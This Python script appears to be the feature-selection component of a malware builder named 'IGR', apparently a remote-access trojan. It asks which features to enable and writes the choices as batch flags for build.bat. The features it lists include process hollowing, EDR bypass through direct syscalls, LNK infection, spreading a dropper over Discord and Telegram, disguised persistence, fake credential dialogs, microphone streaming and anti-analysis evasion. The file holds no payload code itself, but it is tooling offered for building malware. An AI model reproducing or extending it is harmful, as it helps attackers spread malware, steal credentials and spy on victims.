"""Interactive feature selection for IGR build."""
import os
import sys

FEATURES = [
    ("FEAT_POLYMORPHISM", "Code Polymorphism", "Mutate hash signature before compilation"),
    ("FEAT_PROCESS_HOLLOWING", "Process Hollowing", "Inject into legit processes like explorer.exe"),
    ("FEAT_DIRECT_SYSCALLS", "Direct Syscalls", "Bypass EDR hooks via assembly syscalls"),
    ("FEAT_OBFUSCATION", "Advanced Obfuscation", "PyArmor/PyObfuscate bytecode protection"),
    ("FEAT_SELF_SIGN", "Self-Signed Certificate", "Reduce SmartScreen warnings"),
    ("FEAT_PLUGINS", "Plugin System", "Dynamic module loading from server"),
    ("FEAT_ASYNC_IO", "Async Networking", "asyncio for non-blocking connections"),
    ("FEAT_LNK_INFECTION", "LNK File Infection", "Hijack desktop shortcuts"),
    ("FEAT_SPREAD_CHAT", "Chat Spread", "Auto-send dropper via Discord/Telegram"),
    ("FEAT_SAFE_MODE", "Safe Mode Persistence", "Run in Safe Mode with networking"),
    ("FEAT_TASK_SCHED_STEALTH", "Task Scheduler Stealth", "Mimic Windows Update tasks"),
    ("FEAT_REVERSE_PROXY", "Reverse HTTP Proxy", "Browse internet via victim IP"),
    ("FEAT_REMOTE_SOUND", "Remote Sound Playback", "Play audio on victim PC"),
    ("FEAT_MONITOR_TOGGLE", "Monitor Toggle", "Turn victim monitors on/off"),
    ("FEAT_BSOD", "BSOD Simulator", "Fake blue screen of death"),
    ("FEAT_INPUT_LOCK", "Keyboard/Mouse Lock", "Block victim input"),
    ("FEAT_DRAG_DROP", "File Drag & Drop", "Upload files via dashboard drag"),
    ("FEAT_LIVE_AUDIO", "Live Audio Streaming", "Real-time mic via WebSocket"),
    ("FEAT_DARK_LIGHT_MODE", "Dark/Light Mode", "Dashboard theme toggle"),
    ("FEAT_MOBILE_UI", "Mobile Responsive UI", "Smartphone-optimized dashboard"),
    ("FEAT_EXPORT_DATA", "Export to PDF/CSV", "Offline data export"),
    ("FEAT_2FA", "Two-Factor Auth", "OTP via Telegram or Google Authenticator"),
    ("FEAT_SOCIAL_ENGINEER", "Social Engineering Popups", "Fake system dialogs for credentials"),
    ("FEAT_ATTACKER_WHITELIST", "Attacker Whitelist", "Disable anti-analysis for your IP"),
]

def write_feat_file(selections: dict) -> None:
    """Write feature selections as batch set commands for build.bat to call."""
    with open("_feat_flags.bat", "w") as f:
        for key, val in selections.items():
            f.write(f'set "{key}={val}"\n')

def main() -> None:
    print("\n  Feature Set:")
    print("  [1] Full Version    - All features enabled (recommended)")
    print("  [2] Manual Select   - Choose which features to include")
    print()
    choice = input("  Choose feature set (1 or 2): ").strip()
    
    if choice == "1":
        selections = {feat[0]: "1" for feat in FEATURES}
        print("\n  All features enabled.")
    else:
        selections = {feat[0]: "0" for feat in FEATURES}
        print("\n  Select features to enable (y/n each):\n")
        for i, (key, name, desc) in enumerate(FEATURES, 1):
            ans = input(f"  [{i:>2}] {name} - {desc} [y/n]: ").strip().lower()
            selections[key] = "1" if ans == "y" else "0"
    
    write_feat_file(selections)
    enabled = sum(1 for v in selections.values() if v == "1")
    print(f"\n  {enabled}/{len(FEATURES)} features enabled. Saved to _feat_flags.bat.")

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--full":
        selections = {feat[0]: "1" for feat in FEATURES}
        write_feat_file(selections)
    else:
        main()
